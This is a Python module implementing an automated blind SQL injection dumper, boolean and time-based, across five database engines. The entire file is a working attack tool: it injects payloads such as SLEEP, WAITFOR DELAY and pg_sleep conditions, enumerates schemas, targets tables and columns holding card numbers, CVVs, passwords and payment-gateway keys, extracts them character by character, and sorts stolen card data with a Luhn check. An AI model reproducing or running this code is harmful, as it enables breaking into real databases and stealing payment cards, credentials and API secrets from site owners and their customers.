"""
Blind SQL Injection Data Dumper — Boolean + Time-based extraction

Extracts data from blind SQL injection vulnerabilities using:
1. Boolean-based binary search — compares char-by-char via response diff
2. Time-based binary search — measures response delay per character
3. Bitwise extraction — extracts each bit of each character for reliability
4. Adaptive strategy — starts with binary search, falls back to bitwise

Supports: MySQL, MSSQL, PostgreSQL, Oracle, SQLite

Data extraction pipeline:
  1. Extract current database name
  2. Enumerate table names
  3. Filter to high-value tables (cards, users, payments, config)
  4. Enumerate column names for target tables
  5. Extract data row-by-row, char-by-char
  6. Categorize extracted data (cards, creds, gateway keys)

v3.6 — Phase 4: Time-based SQLi Dumping
"""

import asyncio
import re
import time
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple, Callable, Awaitable
from urllib.parse import urlparse

import aiohttp
from loguru import logger

from sqli_scanner import SQLiResult, SQLiScanner


# ====================== DATA CLASSES ======================

@dataclass
class BlindExtractionStats:
    """Stats for the blind extraction process."""
    requests_made: int = 0
    chars_extracted: int = 0
    tables_found: int = 0
    columns_found: int = 0
    rows_extracted: int = 0
    errors: int = 0
    start_time: float = 0.0
    
    @property
    def elapsed(self) -> float:
        return time.monotonic() - self.start_time if self.start_time else 0
    
    @property
    def requests_per_sec(self) -> float:
        return self.requests_made / self.elapsed if self.elapsed > 0 else 0


@dataclass
class BlindDumpResult:
    """Result from a blind extraction session."""
    url: str
    dbms: str
    injection_type: str  # "boolean" or "time"
    database: str = ""
    tables: Dict[str, List[str]] = field(default_factory=dict)
    data: Dict[str, List[Dict]] = field(default_factory=dict)
    card_data: List[Dict] = field(default_factory=list)
    credentials: List[Dict] = field(default_factory=list)
    gateway_keys: List[Dict] = field(default_factory=list)
    stats: BlindExtractionStats = field(default_factory=BlindExtractionStats)
    error: str = ""
    
    @property
    def total_rows(self) -> int:
        return sum(len(rows) for rows in self.data.values())
    
    @property
    def has_valuable_data(self) -> bool:
        return bool(self.card_data or self.credentials or self.gateway_keys)


# ====================== BLIND EXTRACTION ENGINE ======================

class BlindExtractor:
    """
    Low-level blind extraction engine.
    
    Provides two core primitives:
    - boolean_check(condition) — returns True/False based on response analysis
    - time_check(condition) — returns True/False based on response timing
    
    Higher-level methods use these to extract strings char-by-char via binary search.
    """

    def __init__(self, scanner: SQLiScanner, sqli: SQLiResult,
                 session: aiohttp.ClientSession,
                 time_delay: float = 3.0,
                 max_string_len: int = 256,
                 max_retries: int = 2):
        self.scanner = scanner
        self.sqli = sqli
        self.session = session
        self.time_delay = time_delay
        self.max_string_len = max_string_len
        self.max_retries = max_retries
        self.stats = BlindExtractionStats(start_time=time.monotonic())
        
        # Parse URL & params
        self.base, self.params = scanner._parse_url(sqli.url)
        self.param = sqli.parameter
        self.original = (
            self.params[self.param][0] 
            if isinstance(self.params.get(self.param), list) 
            else self.params.get(self.param, "1")
        )
        
        # Determine injection method
        self.is_time_based = sqli.injection_type == "time"
        self.is_boolean_based = sqli.injection_type == "boolean"
        
        # Parse existing payload to get prefix/suffix
        self._prefix, self._suffix = self._parse_payload_context(sqli.payload_used)
        
        # Baseline for boolean detection
        self._baseline_len: Optional[int] = None
        self._false_len: Optional[int] = None

    def _parse_payload_context(self, payload: str) -> Tuple[str, str]:
        """Extract quote/comment style from the original working payload."""
        # Detect quote style
        prefix = "'"
        suffix = "-- -"
        
        if payload:
            # Check if payload starts with a quote
            stripped = payload.lstrip()
            if stripped.startswith("'"):
                prefix = "'"
            elif stripped.startswith('"'):
                prefix = '"'
            elif stripped.startswith("1'"):
                prefix = "1'"
            elif stripped.startswith("1 ") or stripped.startswith(" AND"):
                prefix = ""
            
            # Detect comment suffix
            if "-- -" in payload:
                suffix = "-- -"
            elif "--" in payload:
                suffix = "--"
            elif "#" in payload:
                suffix = "#"
        
        return prefix, suffix

    async def _init_baseline(self):
        """Measure baseline response for boolean detection."""
        if self._baseline_len is not None:
            return
        
        # True condition baseline
        true_body, _ = await self._inject_raw(f"{self._prefix} AND 1=1{self._suffix}")
        # False condition baseline
        false_body, _ = await self._inject_raw(f"{self._prefix} AND 1=2{self._suffix}")
        
        self._baseline_len = len(true_body) if true_body else 0
        self._false_len = len(false_body) if false_body else 0

    async def _inject_raw(self, payload: str) -> Tuple[str, float]:
        """Inject a raw payload and return (body, elapsed)."""
        params = self.params.copy()
        params[self.param] = [f"{self.original}{payload}"]
        url = self.scanner._build_url(self.base, params)
        body, elapsed = await self.scanner._fetch(url, self.session)
        self.stats.requests_made += 1
        return body, elapsed

    async def check_condition(self, sql_condition: str) -> bool:
        """Test if a SQL condition evaluates to True.
        
        Uses boolean response analysis or time delay depending on injection type.
        
        Args:
            sql_condition: SQL expression that evaluates to True/False
                           e.g., "ASCII(SUBSTRING(database(),1,1))>64"
        """
        if self.is_time_based:
            return await self._time_check(sql_condition)
        else:
            return await self._boolean_check(sql_condition)

    async def _boolean_check(self, condition: str) -> bool:
        """Boolean-based condition check — compare response to baseline."""
        await self._init_baseline()
        
        payload = f"{self._prefix} AND ({condition}){self._suffix}"
        body, _ = await self._inject_raw(payload)
        
        if not body:
            return False
        
        body_len = len(body)
        
        # True if response length is closer to the true baseline
        true_diff = abs(body_len - self._baseline_len) if self._baseline_len else body_len
        false_diff = abs(body_len - self._false_len) if self._false_len else 0
        
        return true_diff < false_diff

    async def _time_check(self, condition: str) -> bool:
        """Time-based condition check — measure response delay."""
        dbms = self.sqli.dbms or "mysql"
        
        if dbms in ("mysql", ""):
            sleep_expr = f"SLEEP({self.time_delay})"
        elif dbms == "mssql":
            sleep_expr = f"WAITFOR DELAY '0:0:{int(self.time_delay)}'"
        elif dbms == "postgresql":
            sleep_expr = f"pg_sleep({self.time_delay})"
        elif dbms == "oracle":
            sleep_expr = f"DBMS_PIPE.RECEIVE_MESSAGE('a',{int(self.time_delay)})"
        else:
            sleep_expr = f"SLEEP({self.time_delay})"
        
        # If condition is true → trigger delay (DBMS-specific conditional syntax)
        if dbms == "mssql":
            payload = f"{self._prefix} IF ({condition}) {sleep_expr}{self._suffix}"
        elif dbms in ("postgresql", "oracle", "sqlite"):
            # CASE WHEN is standard SQL — works on PG, Oracle, SQLite
            payload = f"{self._prefix} AND (CASE WHEN ({condition}) THEN {sleep_expr} ELSE 0 END){self._suffix}"
        else:  # mysql (default)
            payload = f"{self._prefix} AND IF(({condition}),{sleep_expr},0){self._suffix}"
        
        _, elapsed = await self._inject_raw(payload)
        
        return elapsed >= (self.time_delay * 0.7)

    # ==================== STRING EXTRACTION ====================

    async def extract_string(self, sql_expr: str, max_len: int = None) -> str:
        """Extract a SQL string expression character by character using binary search.
        
        Args:
            sql_expr: SQL expression returning a string, e.g., "database()"
            max_len: Maximum string length to extract
            
        Returns:
            Extracted string
        """
        if max_len is None:
            max_len = self.max_string_len
        
        # First determine the actual length
        length = await self._extract_length(sql_expr, max_len)
        if length == 0:
            return ""
        
        logger.debug(f"Blind extract: '{sql_expr}' length={length}")
        
        # Extract each character via binary search on ASCII value
        result = []
        for pos in range(1, length + 1):
            char = await self._extract_char(sql_expr, pos)
            if char is None:
                break
            result.append(char)
            self.stats.chars_extracted += 1
        
        return "".join(result)

    async def _extract_length(self, sql_expr: str, max_len: int) -> int:
        """Determine the length of a SQL string expression via binary search."""
        dbms = self.sqli.dbms or "mysql"
        
        if dbms in ("mysql", "", "postgresql", "sqlite"):
            len_func = f"LENGTH({sql_expr})"
        elif dbms == "mssql":
            len_func = f"LEN({sql_expr})"
        elif dbms == "oracle":
            len_func = f"LENGTH({sql_expr})"
        else:
            len_func = f"LENGTH({sql_expr})"
        
        # Binary search for length
        low, high = 0, max_len
        while low < high:
            mid = (low + high + 1) // 2
            cond = f"{len_func}>={mid}"
            if await self.check_condition(cond):
                low = mid
            else:
                high = mid - 1
        
        return low

    async def _extract_char(self, sql_expr: str, position: int) -> Optional[str]:
        """Extract a single character at a given position using binary search on ASCII."""
        dbms = self.sqli.dbms or "mysql"
        
        if dbms in ("mysql", "", "sqlite"):
            char_func = f"ASCII(SUBSTRING({sql_expr},{position},1))"
        elif dbms == "mssql":
            char_func = f"ASCII(SUBSTRING({sql_expr},{position},1))"
        elif dbms == "postgresql":
            char_func = f"ASCII(SUBSTRING({sql_expr},{position},1))"
        elif dbms == "oracle":
            char_func = f"ASCII(SUBSTR({sql_expr},{position},1))"
        else:
            char_func = f"ASCII(SUBSTRING({sql_expr},{position},1))"
        
        # Binary search: printable ASCII range 32–126
        low, high = 32, 126
        
        for retry in range(self.max_retries + 1):
            lo, hi = low, high
            while lo < hi:
                mid = (lo + hi + 1) // 2
                cond = f"{char_func}>={mid}"
                if await self.check_condition(cond):
                    lo = mid
                else:
                    hi = mid - 1
            
            if 32 <= lo <= 126:
                return chr(lo)
            
            # Retry with full range on failure
            if retry < self.max_retries:
                await asyncio.sleep(0.5)
        
        return None

    async def _extract_char_bitwise(self, sql_expr: str, position: int) -> Optional[str]:
        """Extract a single character by testing individual bits (7 bits for ASCII).
        
        More reliable than binary search in noisy environments — each bit is
        an independent test. Requires exactly 7 requests per character
        (vs ~7 average for binary search), but tolerates individual errors better.
        """
        dbms = self.sqli.dbms or "mysql"
        
        if dbms in ("mysql", "", "sqlite"):
            char_func = f"ASCII(SUBSTRING({sql_expr},{position},1))"
        elif dbms == "mssql":
            char_func = f"ASCII(SUBSTRING({sql_expr},{position},1))"
        elif dbms == "postgresql":
            char_func = f"ASCII(SUBSTRING({sql_expr},{position},1))"
        elif dbms == "oracle":
            char_func = f"ASCII(SUBSTR({sql_expr},{position},1))"
        else:
            char_func = f"ASCII(SUBSTRING({sql_expr},{position},1))"
        
        char_val = 0
        for bit in range(7):  # Bits 0-6 (ASCII range 0-127)
            # Test if bit N is set: (val >> N) & 1 = 1
            # Equivalent to: val & (1 << N) != 0
            # Equivalent to: (val / power_of_2) % 2 = 1
            power = 1 << bit
            
            if dbms in ("mysql", "", "sqlite"):
                cond = f"({char_func})>>{bit}&1=1"
            elif dbms == "mssql":
                cond = f"({char_func})/{power}%2=1"
            elif dbms == "postgresql":
                cond = f"({char_func})>>{bit}&1=1"
            elif dbms == "oracle":
                cond = f"BITAND({char_func},{power})={power}"
            else:
                cond = f"({char_func})>>{bit}&1=1"
            
            if await self.check_condition(cond):
                char_val |= power
        
        if 32 <= char_val <= 126:
            return chr(char_val)
        elif char_val == 0:
            return None  # NULL or end of string
        
        return None

    async def extract_string_adaptive(self, sql_expr: str, max_len: int = 255) -> str:
        """Extract a string with adaptive strategy: start with binary search,
        fall back to bitwise on failures.
        
        This is the recommended extraction method for noisy environments.
        """
        length = await self._extract_length(sql_expr, max_len)
        if not length:
            return ""
        
        result_chars = []
        consecutive_failures = 0
        use_bitwise = False
        
        for pos in range(1, length + 1):
            char = None
            
            if not use_bitwise:
                char = await self._extract_char(sql_expr, pos)
                if char is None:
                    consecutive_failures += 1
                    if consecutive_failures >= 3:
                        logger.info("Switching to bitwise extraction due to repeated failures")
                        use_bitwise = True
                        char = await self._extract_char_bitwise(sql_expr, pos)
                else:
                    consecutive_failures = 0
            else:
                char = await self._extract_char_bitwise(sql_expr, pos)
            
            if char is None:
                result_chars.append("?")
            else:
                result_chars.append(char)
            
            self.stats.requests_made += 1
            self.stats.chars_extracted += 1
        
        return "".join(result_chars)

    async def extract_int(self, sql_expr: str, max_val: int = 10000) -> int:
        """Extract an integer SQL expression via binary search.
        
        Args:
            sql_expr: SQL expression returning an integer, e.g., "COUNT(*)"
            max_val: Maximum expected value
        """
        low, high = 0, max_val
        while low < high:
            mid = (low + high + 1) // 2
            cond = f"({sql_expr})>={mid}"
            if await self.check_condition(cond):
                low = mid
            else:
                high = mid - 1
        return low

    async def extract_string_list(self, sql_expr_template: str,
                                   count: int, max_item_len: int = 64) -> List[str]:
        """Extract a list of strings (e.g., table names, column names).
        
        Args:
            sql_expr_template: Template with {offset} placeholder,
                               e.g., "(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {offset},1)"
            count: Number of items to extract
            max_item_len: Max length per item
            
        Returns:
            List of extracted strings
        """
        items = []
        for i in range(count):
            expr = sql_expr_template.format(offset=i)
            item = await self.extract_string(expr, max_len=max_item_len)
            if not item:
                break
            items.append(item)
            logger.debug(f"  Extracted item {i+1}/{count}: {item}")
        return items


# ====================== BLIND DUMPER ======================

class BlindDumper:
    """
    High-level blind SQL injection data dumper.
    
    Uses BlindExtractor to perform full data extraction:
    1. Get current database name
    2. Enumerate tables
    3. Filter to high-value targets
    4. Enumerate columns
    5. Extract data row-by-row
    """

    # High-value table patterns (same as SQLiDumper for consistency)
    TARGET_TABLE_PATTERNS = [
        r"card|credit|cc|payment|billing|transaction",
        r"user|member|account|customer|client|admin|login|auth",
        r"order|invoice|purchase|checkout|sale|cart",
        r"config|setting|option|api_key|secret|credential|key",
    ]

    TARGET_COLUMN_PATTERNS = [
        # Card data
        r"card.?(number|num|no)|cc.?(number|num)|pan|credit.?card",
        r"cvv|cvc|cvv2|cvc2|security.?code|card.?code",
        r"expir|exp.?(date|month|year)|valid.?thru",
        r"cardholder|card.?holder|name.?on.?card",
        # Credentials
        r"password|passwd|pwd|pass|hash|secret|pin|passcode|auth.?token",
        r"email|e.?mail|contact.?email",
        r"username|user.?name|login|uname|user.?id|nickname",
        # Gateway keys
        r"stripe|braintree|paypal|api.?key|secret.?key|merchant|private.?key|access.?token",
        r"client.?id|client.?secret|consumer.?key|webhook.?secret",
        # Billing
        r"address|city|state|zip|country|phone|ssn|social.?security|tax.?id|dob|birth",
    ]

    def __init__(self, scanner: SQLiScanner,
                 time_delay: float = 3.0,
                 max_rows: int = 50,
                 max_tables: int = 15,
                 max_columns: int = 20,
                 max_string_len: int = 256,
                 timeout: int = 30):
        self.scanner = scanner
        self.time_delay = time_delay
        self.max_rows = max_rows
        self.max_tables = max_tables
        self.max_columns = max_columns
        self.max_string_len = max_string_len
        self.timeout = timeout
        self._compiled_table_patterns = [re.compile(p, re.I) for p in self.TARGET_TABLE_PATTERNS]
        self._compiled_column_patterns = [re.compile(p, re.I) for p in self.TARGET_COLUMN_PATTERNS]

    def _is_target_table(self, name: str) -> bool:
        for pat in self._compiled_table_patterns:
            if pat.search(name):
                return True
        return False

    def _is_target_column(self, name: str) -> bool:
        for pat in self._compiled_column_patterns:
            if pat.search(name):
                return True
        return False

    async def blind_dump(self, sqli: SQLiResult,
                         session: aiohttp.ClientSession,
                         progress_callback: Callable[[str], Awaitable[None]] = None) -> BlindDumpResult:
        """Perform full blind data extraction.
        
        Args:
            sqli: SQLiResult with boolean or time injection confirmed
            session: aiohttp session
            progress_callback: Optional async callback for progress updates
            
        Returns:
            BlindDumpResult with extracted data
        """
        result = BlindDumpResult(
            url=sqli.url,
            dbms=sqli.dbms or "unknown",
            injection_type=sqli.injection_type,
        )
        
        extractor = BlindExtractor(
            scanner=self.scanner,
            sqli=sqli,
            session=session,
            time_delay=self.time_delay,
            max_string_len=self.max_string_len,
        )
        result.stats = extractor.stats
        
        try:
            # Step 1: Get current database name
            if progress_callback:
                await progress_callback("🔍 Extracting database name...")
            
            db_name = await self._extract_database_name(extractor, sqli.dbms)
            result.database = db_name
            logger.info(f"Blind dump: database = '{db_name}'")
            
            if progress_callback:
                await progress_callback(f"📦 Database: {db_name}")
            
            # Step 2: Enumerate tables
            if progress_callback:
                await progress_callback("📋 Enumerating tables...")
            
            all_tables = await self._enumerate_tables(extractor, sqli.dbms, db_name)
            result.stats.tables_found = len(all_tables)
            logger.info(f"Blind dump: found {len(all_tables)} tables")
            
            if not all_tables:
                result.error = "No tables found"
                return result
            
            # Step 3: Filter to high-value targets
            target_tables = [t for t in all_tables if self._is_target_table(t)]
            if not target_tables:
                target_tables = all_tables[:5]
                logger.info(f"No high-value tables, checking first {len(target_tables)}")
            else:
                logger.info(f"Target tables: {target_tables}")
            
            target_tables = target_tables[:self.max_tables]
            
            if progress_callback:
                await progress_callback(
                    f"🎯 {len(target_tables)} target tables: {', '.join(target_tables[:5])}"
                )
            
            # Step 4+5: For each target table, enumerate columns and extract data
            for table_idx, table in enumerate(target_tables):
                if progress_callback:
                    await progress_callback(
                        f"📊 [{table_idx+1}/{len(target_tables)}] Processing table: {table}"
                    )
                
                # Enumerate columns
                columns = await self._enumerate_columns(
                    extractor, sqli.dbms, db_name, table
                )
                result.stats.columns_found += len(columns)
                
                if not columns:
                    logger.debug(f"No columns found for table '{table}'")
                    continue
                
                result.tables[table] = columns
                
                # Filter to high-value columns or take all if few
                target_cols = [c for c in columns if self._is_target_column(c)]
                if not target_cols:
                    target_cols = columns[:self.max_columns]
                
                logger.info(f"  Table '{table}': extracting {len(target_cols)} columns: {target_cols[:5]}")
                
                # Get row count
                row_count = await self._get_row_count(
                    extractor, sqli.dbms, table, db_name
                )
                extract_count = min(row_count, self.max_rows)
                
                if extract_count == 0:
                    continue
                
                if progress_callback:
                    await progress_callback(
                        f"  📥 Extracting {extract_count} rows × {len(target_cols)} cols from {table}"
                    )
                
                # Extract data
                rows = await self._extract_rows(
                    extractor, sqli.dbms, db_name, table, target_cols, extract_count
                )
                
                if rows:
                    result.data[table] = rows
                    result.stats.rows_extracted += len(rows)
                    
                    # Categorize rows
                    for row in rows:
                        self._categorize_row(row, result)
                    
                    logger.info(f"  Extracted {len(rows)} rows from {table}")
                
                # Small delay between tables
                await asyncio.sleep(0.5)
            
            # Log summary
            logger.info(
                f"Blind dump complete: {result.database} — "
                f"{len(result.tables)} tables, {result.total_rows} rows, "
                f"{len(result.card_data)} cards, {len(result.credentials)} creds, "
                f"{len(result.gateway_keys)} keys | "
                f"{result.stats.requests_made} requests in {result.stats.elapsed:.0f}s"
            )
            
        except asyncio.TimeoutError:
            result.error = "Timeout during blind extraction"
            logger.warning(f"Blind dump timeout: {sqli.url}")
        except Exception as e:
            result.error = str(e)
            logger.error(f"Blind dump error: {sqli.url}: {e}")
        
        return result

    # ==================== DATABASE ENUMERATION ====================

    async def _extract_database_name(self, ext: BlindExtractor, dbms: str) -> str:
        """Extract the current database name."""
        if dbms in ("mysql", ""):
            return await ext.extract_string("database()", max_len=64)
        elif dbms == "mssql":
            return await ext.extract_string("DB_NAME()", max_len=64)
        elif dbms == "postgresql":
            return await ext.extract_string("current_database()", max_len=64)
        elif dbms == "oracle":
            return await ext.extract_string(
                "(SELECT ora_database_name FROM dual)", max_len=64
            )
        elif dbms == "sqlite":
            return "main"  # SQLite always uses 'main'
        return await ext.extract_string("database()", max_len=64)

    async def _enumerate_tables(self, ext: BlindExtractor, dbms: str,
                                 db_name: str) -> List[str]:
        """Enumerate all table names in the current database."""
        # First get table count
        if dbms in ("mysql", ""):
            count_expr = (
                f"(SELECT COUNT(*) FROM information_schema.tables "
                f"WHERE table_schema=database())"
            )
            item_template = (
                f"(SELECT table_name FROM information_schema.tables "
                f"WHERE table_schema=database() LIMIT {{offset}},1)"
            )
        elif dbms == "mssql":
            count_expr = "(SELECT COUNT(*) FROM sysobjects WHERE xtype='U')"
            item_template = (
                "(SELECT TOP 1 name FROM (SELECT TOP {n} name FROM sysobjects "
                "WHERE xtype='U' ORDER BY name) AS T ORDER BY name DESC)"
            )
        elif dbms == "postgresql":
            count_expr = (
                "(SELECT COUNT(*) FROM information_schema.tables "
                "WHERE table_schema='public')"
            )
            item_template = (
                "(SELECT table_name FROM information_schema.tables "
                "WHERE table_schema='public' LIMIT 1 OFFSET {offset})"
            )
        elif dbms == "oracle":
            count_expr = "(SELECT COUNT(*) FROM user_tables)"
            item_template = (
                "(SELECT table_name FROM (SELECT table_name, ROWNUM rn "
                "FROM user_tables) WHERE rn={offset_1})"
            )
        elif dbms == "sqlite":
            count_expr = (
                "(SELECT COUNT(*) FROM sqlite_master "
                "WHERE type='table' AND name NOT LIKE 'sqlite_%')"
            )
            item_template = (
                "(SELECT name FROM sqlite_master "
                "WHERE type='table' AND name NOT LIKE 'sqlite_%' "
                "LIMIT 1 OFFSET {offset})"
            )
        else:
            count_expr = (
                "(SELECT COUNT(*) FROM information_schema.tables "
                "WHERE table_schema=database())"
            )
            item_template = (
                "(SELECT table_name FROM information_schema.tables "
                "WHERE table_schema=database() LIMIT {offset},1)"
            )
        
        table_count = await ext.extract_int(count_expr, max_val=500)
        table_count = min(table_count, 100)  # Cap at 100 tables
        logger.info(f"Blind: {table_count} tables to enumerate")
        
        tables = []
        for i in range(table_count):
            if dbms == "mssql":
                expr = item_template.format(n=i+1)
            elif dbms == "oracle":
                expr = item_template.format(offset_1=i+1)
            else:
                expr = item_template.format(offset=i)
            
            name = await ext.extract_string(expr, max_len=64)
            if name:
                tables.append(name)
                logger.debug(f"  Table {i+1}/{table_count}: {name}")
            else:
                break
        
        return tables

    async def _enumerate_columns(self, ext: BlindExtractor, dbms: str,
                                  db_name: str, table: str) -> List[str]:
        """Enumerate column names for a specific table."""
        if dbms in ("mysql", ""):
            count_expr = (
                f"(SELECT COUNT(*) FROM information_schema.columns "
                f"WHERE table_schema=database() AND table_name='{table}')"
            )
            item_template = (
                f"(SELECT column_name FROM information_schema.columns "
                f"WHERE table_schema=database() AND table_name='{table}' "
                f"LIMIT {{offset}},1)"
            )
        elif dbms == "mssql":
            count_expr = (
                f"(SELECT COUNT(*) FROM information_schema.columns "
                f"WHERE table_name='{table}')"
            )
            item_template = (
                f"(SELECT TOP 1 column_name FROM (SELECT TOP {{n}} column_name "
                f"FROM information_schema.columns WHERE table_name='{table}' "
                f"ORDER BY ordinal_position) AS T ORDER BY column_name DESC)"
            )
        elif dbms == "postgresql":
            count_expr = (
                f"(SELECT COUNT(*) FROM information_schema.columns "
                f"WHERE table_schema='public' AND table_name='{table}')"
            )
            item_template = (
                f"(SELECT column_name FROM information_schema.columns "
                f"WHERE table_schema='public' AND table_name='{table}' "
                f"LIMIT 1 OFFSET {{offset}})"
            )
        elif dbms == "oracle":
            count_expr = (
                f"(SELECT COUNT(*) FROM user_tab_columns "
                f"WHERE table_name=UPPER('{table}'))"
            )
            item_template = (
                f"(SELECT column_name FROM (SELECT column_name, ROWNUM rn "
                f"FROM user_tab_columns WHERE table_name=UPPER('{table}')) "
                f"WHERE rn={{offset_1}})"
            )
        elif dbms == "sqlite":
            # SQLite doesn't have information_schema — use pragma
            # We'll use a subquery trick
            count_expr = (
                f"(SELECT COUNT(*) FROM pragma_table_info('{table}'))"
            )
            item_template = (
                f"(SELECT name FROM pragma_table_info('{table}') "
                f"LIMIT 1 OFFSET {{offset}})"
            )
        else:
            count_expr = (
                f"(SELECT COUNT(*) FROM information_schema.columns "
                f"WHERE table_schema=database() AND table_name='{table}')"
            )
            item_template = (
                f"(SELECT column_name FROM information_schema.columns "
                f"WHERE table_schema=database() AND table_name='{table}' "
                f"LIMIT {{offset}},1)"
            )
        
        col_count = await ext.extract_int(count_expr, max_val=200)
        col_count = min(col_count, 50)  # Cap at 50 columns
        
        columns = []
        for i in range(col_count):
            if dbms == "mssql":
                expr = item_template.format(n=i+1)
            elif dbms == "oracle":
                expr = item_template.format(offset_1=i+1)
            else:
                expr = item_template.format(offset=i)
            
            name = await ext.extract_string(expr, max_len=64)
            if name:
                columns.append(name)
            else:
                break
        
        return columns

    async def _get_row_count(self, ext: BlindExtractor, dbms: str,
                              table: str, db_name: str) -> int:
        """Get the number of rows in a table."""
        return await ext.extract_int(f"(SELECT COUNT(*) FROM {table})", max_val=10000)

    # ==================== DATA EXTRACTION ====================

    async def _extract_rows(self, ext: BlindExtractor, dbms: str, db_name: str,
                             table: str, columns: List[str],
                             max_rows: int) -> List[Dict]:
        """Extract rows from a table character by character."""
        rows = []
        
        for row_idx in range(max_rows):
            row = {}
            empty_row = True
            
            for col in columns:
                if dbms in ("mysql", "", "sqlite"):
                    expr = f"(SELECT {col} FROM {table} LIMIT {row_idx},1)"
                elif dbms == "mssql":
                    # MSSQL: Use OFFSET/FETCH for newer versions, or ROW_NUMBER
                    expr = (
                        f"(SELECT TOP 1 CAST({col} AS VARCHAR(MAX)) FROM "
                        f"(SELECT {col}, ROW_NUMBER() OVER (ORDER BY (SELECT 1)) AS rn "
                        f"FROM {table}) AS T WHERE rn={row_idx+1})"
                    )
                elif dbms == "postgresql":
                    expr = f"(SELECT {col}::text FROM {table} LIMIT 1 OFFSET {row_idx})"
                elif dbms == "oracle":
                    expr = (
                        f"(SELECT {col} FROM (SELECT {col}, ROWNUM rn "
                        f"FROM {table}) WHERE rn={row_idx+1})"
                    )
                else:
                    expr = f"(SELECT {col} FROM {table} LIMIT {row_idx},1)"
                
                value = await ext.extract_string(expr, max_len=self.max_string_len)
                row[col] = value
                if value:
                    empty_row = False
            
            if empty_row:
                break  # No more data
            
            rows.append(row)
        
        return rows

    # ==================== DATA CATEGORIZATION ====================

    def _categorize_row(self, row: Dict[str, str], result: BlindDumpResult):
        """Categorize extracted data into cards, credentials, and gateway keys."""
        row_lower = {k.lower(): v for k, v in row.items()}
        
        # Check for card data patterns
        card_entry = {}
        for col, val in row_lower.items():
            if not val:
                continue
            # Card numbers (13-19 digits, possibly with spaces/dashes)
            clean_val = re.sub(r'[\s\-]', '', val)
            if re.match(r'^\d{13,19}$', clean_val) and self._luhn_check(clean_val):
                card_entry["card_number"] = val
            elif re.match(r'^\d{3,4}$', val) and any(k in col for k in ["cvv", "cvc", "security", "code"]):
                card_entry["cvv"] = val
            elif any(k in col for k in ["expir", "exp", "valid"]):
                card_entry["expiry"] = val
            elif any(k in col for k in ["holder", "cardholder", "name_on"]):
                card_entry["cardholder"] = val
        
        if card_entry.get("card_number"):
            result.card_data.append(card_entry)
        
        # Check for credentials
        cred_entry = {}
        for col, val in row_lower.items():
            if not val:
                continue
            if any(k in col for k in ["password", "passwd", "pwd", "pass", "hash", "secret"]):
                cred_entry["password"] = val
            elif any(k in col for k in ["email", "mail"]):
                cred_entry["email"] = val
            elif any(k in col for k in ["username", "user", "login", "uname"]):
                cred_entry["username"] = val
        
        if cred_entry.get("password") or (cred_entry.get("email") and cred_entry.get("username")):
            result.credentials.append(cred_entry)
        
        # Check for gateway keys
        for col, val in row_lower.items():
            if not val or len(val) < 8:
                continue
            if any(k in col for k in [
                "stripe", "braintree", "paypal", "api_key", "apikey",
                "secret_key", "merchant", "private_key", "access_token",
                "client_id", "client_secret", "consumer_key",
            ]):
                result.gateway_keys.append({
                    "column": col,
                    "value": val,
                    "source": "blind_dump",
                })
            # Also check values that look like API keys
            if re.match(r'^(sk_live_|pk_live_|sk_test_|pk_test_)', val):
                result.gateway_keys.append({
                    "column": col,
                    "value": val,
                    "source": "blind_dump",
                })

    @staticmethod
    def _luhn_check(number: str) -> bool:
        """Validate a card number with the Luhn algorithm."""
        try:
            digits = [int(d) for d in number]
            odd_digits = digits[-1::-2]
            even_digits = digits[-2::-2]
            total = sum(odd_digits)
            for d in even_digits:
                total += sum(divmod(d * 2, 10))
            return total % 10 == 0
        except (ValueError, IndexError):
            return False
